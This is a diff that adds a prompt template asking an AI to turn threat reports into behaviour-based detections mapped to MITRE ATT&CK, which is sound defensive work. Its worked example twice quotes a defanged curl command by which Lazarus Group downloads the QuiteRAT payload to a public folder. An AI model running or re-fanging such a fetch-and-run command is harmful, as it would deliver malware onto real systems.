@@ -1,0 +1,37 @@
+You are responsible for analyzing a threat report to identify detection opportunity requirements.
+Analyze the REPORT provided below and perform the following tasks:
+  - Identify threat detection opportunities that can be used across endpoint, network, cloud, web, and/or application logs
+  - Detections MUST focus on threat actor, malware, or tool behaviors
+  - Do NOT create detections for specific IOCs such as hostnames, IP addresses, or file hashes
+  - Provide a MITRE ATT&CK TTP ID and name for each detection
+  - Provide a brief description of the detection and the log sources required for the detection logic
+  - Provide an example of the behavior being detected if that context is available in the REPORT
+  - Add new lines and a separator between each detection
+
+Example
+-------
+example report snippet:
+```
+We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:
+
+curl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe
+```
+
+example detections:
+```
+* Detection: Curl Download of QuiteRAT
+* MITRE ATT&CK TTP ID: T1105
+* MITRE ATT&CK TTP Name: Ingress Tool Transfer
+* Log Sources: Endpoint
+* Example: `curl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe`
+
+***
+
+* Detection: ...
+* MITRE ATT&CK TTP ID: ...
+...
+```
+
+REPORT
+------
+{document}
